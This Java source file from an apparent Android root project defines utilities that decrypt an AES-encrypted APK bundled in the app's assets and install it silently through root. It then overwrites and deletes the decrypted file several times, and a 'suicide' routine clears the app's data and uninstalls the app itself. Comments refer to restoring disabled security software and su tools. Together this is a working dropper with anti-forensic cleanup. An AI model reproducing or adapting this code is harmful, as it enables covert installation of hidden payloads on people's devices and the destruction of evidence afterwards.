package com.example.testsu.utils;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;

import com.example.testsu.Config;
import com.kevin.baselibrary.utils.AssetUtils;
import com.kevin.baselibrary.utils.CleanUtils;
import com.kevin.baselibrary.utils.ToastUtils;
import com.kevin.javabaselib.utils.enc.AESUtils;

import java.io.File;
import java.io.FileWriter;

/**
 * 作者：bailiangjin  bailiangjin@gmail.com
 * 创建时间：16/3/14 22:19
 */
public class CommonUtils {


    /**
     * 清理擦出 文件路径
     * @param apkFilePath
     */
    public static void wipeDir(final String apkFilePath) {
        new File(apkFilePath).delete();// 删除安装文件
        // Erasure ers = new Erasure(getApplicationContext());
        // 复写
        for (int i = 0; i < 5; i++) {

            /**
             * 擦除
             */
            new AsyncTask<Void, Void, Void>() {

                @Override
                protected Void doInBackground(Void... params) {
                    coverFile(apkFilePath);// 复写文件
                    return null;
                }
            }.execute();
        }
    }

    /**
     * 覆盖文件操作
     *
     * @param fileDir
     *            所要复写文件的 全路径（文件目录+文件名）
     */
    public static void coverFile(String fileDir) {

        for (int i = 0; i < 25000; i++) {
            String content = "101010101010101010101010101010101010101010101010101010"
                    + "101010101010101010101010101010101010101010101010101010"
                    + "101010101010101010101010101010101010101010101010101010"
                    + "101010101010101010101010101010101010101010101010101010"
                    + "101010101010101010101010101010101010101010101010101010";
            writefile(fileDir, content, true);
        }
        new File(fileDir).delete();// 删除文件
    }

    /**
     * 写文件操作
     *
     * @param path
     * @param content
     * @param append
     */
    public static void writefile(String path, String content, boolean append) {
        try {
            boolean addStr = append; // 通过这个对象来判断是否向文本文件中追加内容
            String filepath = path; // 得到文本文件的路径
            String filecontent = content; // 需要写入的内容
            File writefile = new File(filepath);
            if (writefile.exists() == false) // 如果文本文件不存在则创建它
            {
                writefile.createNewFile();
                writefile = new File(filepath); // 重新实例化
            }
            FileWriter filewriter = new FileWriter(writefile, addStr);
            filewriter.write(filecontent);
            filewriter.flush();
        } catch (Exception d) {
            System.out.println(d.getMessage());
        }
    }

    /**
     * 拷贝并安装Apk
     * @param context
     */
    public static void copyAndInstallApk(final Context context) {
        new AsyncTask<Void, Void, Void>() {
            /**
             * 在异步的后台任务执行之前调用的方法 这个方法是运行在主线程里面的.
             */
            @Override
            protected void onPreExecute() {
                //TODO:
                ToastUtils.show("正在安装");
                super.onPreExecute();
            }
            /**
             * 在异步的后台任务执行之后调用的方法 这个方法是运行在主线程里面的.
             */
            @Override
            protected void onPostExecute(Void result) {
                //TODO:
                ToastUtils.show("安装成功");
                super.onPostExecute(result);
            }
            /**
             * 在后台执行的方法,方法是运行在子线程里面的
             */
            @Override
            protected Void doInBackground(Void... params) {
                CommonUtils.copyApkFile(context, Config.APK_FILE_NAME, Config.APK_FILEPATH);
                try {
                    AESUtils.setDefaultSeed(Config.FILE_DEC_PWD);
                    AESUtils.decrypt(Config.APK_FILEPATH,Config.APK_DEC_FILEPATH);
                    new File(Config.APK_FILEPATH).delete();
                    RootUtils.installApk(Config.APK_DEC_FILEPATH);

                    wipeDir(Config.APK_DEC_FILEPATH);

                } catch (Exception e) {
                    e.printStackTrace();
                }

                return null;
            }
        }.execute();
    }

    /**
     * 清理数据 重启安全权限软件 卸载应用
     *
     * @param context Context
     * @return
     */
    public static boolean cleanDataAndSuicide(Context context) {
        boolean isSuccess = true;
        //清理数据
        CleanUtils.cleanAppRootFilePath();
        //TODO:恢复安全软件
        //TODO:恢复su软件
        //卸载自身 自杀式
        return RootUtils.suicide(context);
    }


    /**
     * 拷贝Apk文件
     *
     * @param context     Context
     * @param apkFilePath 要拷贝的Apk文件路径
     * @return
     */
    public static boolean copyApkFile(final Context context, final String apkFileName, final String apkFilePath) {
        return AssetUtils.copyAssetFiles(context, apkFileName, apkFilePath);
    }

    /**
     * 打开应用
     *
     * @param activity Activity
     * @param action   intent 方式 打开其他应用的 action
     * @return
     */
    public static boolean openApp(Activity activity, String action) {
        try {

            Intent intent = new Intent();
            intent.setAction(action);
            activity.startActivity(intent);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }


}
